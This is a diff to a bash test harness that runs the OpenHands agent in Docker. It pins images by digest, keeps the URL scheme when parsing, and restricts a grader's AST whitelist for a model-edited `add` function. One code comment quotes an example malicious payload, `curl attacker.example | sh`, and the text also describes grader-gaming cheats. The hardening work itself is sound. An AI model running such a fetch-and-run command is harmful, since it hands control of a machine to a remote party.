@@ -70,8 +70,19 @@ set -euo pipefail
 # baseline must match the OpenHands major version. Currently:
 #   od_v0.9.0_image_nikolaik___python-nodejs_tag_python3.11-nodejs22
 # ---------------------------------------------------------------------------
-OPENHANDS_IMAGE="ghcr.io/all-hands-ai/openhands:0.9.0"
-OPENHANDS_RUNTIME_IMAGE="ghcr.io/all-hands-ai/runtime:od_v0.9.0_image_nikolaik___python-nodejs_tag_python3.11-nodejs22"
+# Codex #1048 round-6 finding #2 (BLOCKING): the harness mounts
+# ``/var/run/docker.sock`` into the OpenHands container, so a moved or
+# compromised tag would hand host-daemon control to a swapped image.
+# Both refs are pinned by multi-arch manifest-list digest as of the
+# 2026-07-07 harness commit; the human-readable ``:tag`` piece is
+# retained purely as a comment for future upgraders. Regenerate with
+# ``docker buildx imagetools inspect <ref> | awk '/^Digest:/ {print $2}'``
+# when bumping to a newer OpenHands release. Also keep this lane
+# restricted to isolated Docker hosts — do NOT run the harness on a
+# workstation that also runs the operator's rapid-mlx production
+# services.
+OPENHANDS_IMAGE="ghcr.io/all-hands-ai/openhands:0.9.0@sha256:d4b028e3b1f7ad6fdb1bba3579362c8298bb791b222e73a8355fd980bb987f1a"
+OPENHANDS_RUNTIME_IMAGE="ghcr.io/all-hands-ai/runtime:od_v0.9.0_image_nikolaik___python-nodejs_tag_python3.11-nodejs22@sha256:784f7161295b87d3af26332dbbad5bcdd643641e87ed0038ed0c7f4b47c9472d"
 
 TIMEOUT=600
 MAX_ITERATIONS=10
@@ -177,15 +188,23 @@ if not host or port is None:
 # urllib strips the surrounding brackets from IPv6 hosts already
 # (``[::1]:8802`` → ``::1``), so a plain string equality against the
 # loopback set below works for both v4 and v6 aliases.
-print(f"{host}\t{port}")
+# Codex #1048 round-6 finding #1 (BLOCKING): also emit the scheme so
+# the URL rebuild below preserves ``https://`` when the caller passed
+# an HTTPS remote-serve node. Previous code hard-wired ``http://`` and
+# would silently connect over the wrong protocol.
+print(f"{parsed.scheme}\t{host}\t{port}")
 PYEOF
 )"; then
     echo "ERROR: could not parse --base-url=$BASE_URL" >&2
     exit 1
 fi
 
-CONTAINER_HOST="${_URL_PARTS%$'\t'*}"
-CONTAINER_PORT="${_URL_PARTS##*$'\t'}"
+# Split three tab-separated fields (scheme / host / port) with awk so
+# we do not have to care about IPv6 colons or the bash-3.2 lack of
+# named-array literals.
+CONTAINER_SCHEME="$(printf '%s\n' "$_URL_PARTS" | awk -F '\t' '{print $1}')"
+CONTAINER_HOST="$(printf '%s\n' "$_URL_PARTS" | awk -F '\t' '{print $2}')"
+CONTAINER_PORT="$(printf '%s\n' "$_URL_PARTS" | awk -F '\t' '{print $3}')"
 
 # Codex #1048 round-3 finding #1 (BLOCKING): explicitly validate the
 # tab-delimited shape of the Python parser output BEFORE downstream
@@ -193,11 +212,11 @@ CONTAINER_PORT="${_URL_PARTS##*$'\t'}"
 # tab on the ERROR path — but if a future edit accidentally leaks an
 # error onto stdout, we'd construct a malformed CONTAINER_BASE_URL and
 # hit Docker with garbage. This gate turns that into a fast exit 1.
-if [ -z "$CONTAINER_HOST" ] || [ -z "$CONTAINER_PORT" ] \
-   || [ "$CONTAINER_HOST" = "$_URL_PARTS" ] \
+if [ -z "$CONTAINER_SCHEME" ] || [ -z "$CONTAINER_HOST" ] || [ -z "$CONTAINER_PORT" ] \
+   || ! [[ "$CONTAINER_SCHEME" =~ ^https?$ ]] \
    || ! [[ "$CONTAINER_PORT" =~ ^[0-9]+$ ]]; then
-    echo "ERROR: URL parser returned malformed host/port shape " >&2
-    echo "       (raw='$_URL_PARTS' host='$CONTAINER_HOST' port='$CONTAINER_PORT')" >&2
+    echo "ERROR: URL parser returned malformed scheme/host/port shape " >&2
+    echo "       (raw='$_URL_PARTS' scheme='$CONTAINER_SCHEME' host='$CONTAINER_HOST' port='$CONTAINER_PORT')" >&2
     exit 1
 fi
 
@@ -215,13 +234,14 @@ esac
 
 # Re-bracket IPv6 hosts for URL assembly. ``host.docker.internal`` and
 # IPv4 literals go through unchanged; only literal IPv6 addresses need
-# the ``[…]`` wrapping per RFC 3986 §3.2.2.
+# the ``[…]`` wrapping per RFC 3986 §3.2.2. Scheme comes from the
+# parsed input so ``--base-url https://...`` round-trips correctly.
 case "$CONTAINER_HOST" in
     *:*)
-        CONTAINER_BASE_URL="http://[${CONTAINER_HOST}]:${CONTAINER_PORT}/v1"
+        CONTAINER_BASE_URL="${CONTAINER_SCHEME}://[${CONTAINER_HOST}]:${CONTAINER_PORT}/v1"
         ;;
     *)
-        CONTAINER_BASE_URL="http://${CONTAINER_HOST}:${CONTAINER_PORT}/v1"
+        CONTAINER_BASE_URL="${CONTAINER_SCHEME}://${CONTAINER_HOST}:${CONTAINER_PORT}/v1"
         ;;
 esac
 
@@ -432,9 +452,12 @@ fi
 # ever bad or compromised. Fix: swap to a strict **AST whitelist** —
 # parse the file, find ``def add(a, b): …``, and require the return
 # expression to be one of a small semantic-add whitelist (``a + b``,
-# ``b + a``, ``sum([a, b])`` / ``sum((a, b))``, ``operator.add(a, b)``).
-# Zero code execution, so the host is never exposed to the model's
-# output.
+# ``b + a``, ``sum([a, b])`` / ``sum((a, b))``). The ``operator.add``
+# branch was in the whitelist through round-4 but was dropped in
+# round-5 because it accepted a return of ``operator.add(a, b)`` even
+# when ``import operator`` was missing at module top level (would
+# ``NameError`` at import time). Zero code execution, so the host is
+# never exposed to the model's output.
 #
 # The whitelist is intentionally tight — a strict pattern match on
 # argument names (``a``, ``b``, in either order) — which makes the
@@ -444,8 +467,9 @@ fi
 # the AST shape itself is what's asserted, not the numeric behavior.
 # Rejects on any of:
 #   * missing ``def add`` or a signature that isn't ``(a, b)``
-#   * a return expression that isn't a bare Name-Name addition, a
-#     ``sum([a, b])``/``sum((a, b))`` call, or ``operator.add(a, b)``
+#   * extra top-level statements next to the ``def add`` (round-6 #3)
+#   * a return expression that isn't a bare Name-Name addition or a
+#     ``sum([a, b])`` / ``sum((a, b))`` call
 #   * an extra return / conditional / assignment inside the function
 #     body before the return (defence-in-depth against
 #     ``if <cond>: return 5`` style cheats)
@@ -470,6 +494,36 @@ except SyntaxError as exc:
 # find the nested ``add`` and pass — but the module doesn't expose a
 # top-level ``add`` any more, so an actual user of the file gets
 # ``NameError``. Restrict to top-level statements only.
+#
+# Codex #1048 round-6 finding #3 (BLOCKING): the previous gate accepted
+# ANY extra top-level statement as long as a ``def add`` was somewhere
+# in the module — so ``import os; os.system('curl attacker.example |
+# sh'); def add(a, b): return a + b`` would pass despite the prompt
+# telling the agent "Do not modify anything else." Restrict the module
+# body to a single top-level statement (the ``def add``) plus an
+# optional leading module docstring. Anything else is rejected.
+module_body = list(tree.body)
+if module_body and (
+    isinstance(module_body[0], ast.Expr)
+    and isinstance(module_body[0].value, ast.Constant)
+    and isinstance(module_body[0].value.value, str)
+):
+    module_body = module_body[1:]
+if len(module_body) != 1 or not (
+    isinstance(module_body[0], ast.FunctionDef) and module_body[0].name == "add"
+):
+    print(
+        "[correctness] AST-ERROR: module top level must be a single "
+        "``def add`` (optionally preceded by a docstring); got "
+        + ", ".join(
+            f"{type(n).__name__}"
+            f"({getattr(n, 'name', getattr(getattr(n, 'value', None), 'id', '?'))})"
+            for n in module_body
+        ),
+        file=sys.stderr,
+    )
+    sys.exit(1)
+
 funcs = [
     n for n in tree.body
     if isinstance(n, ast.FunctionDef) and n.name == "add"
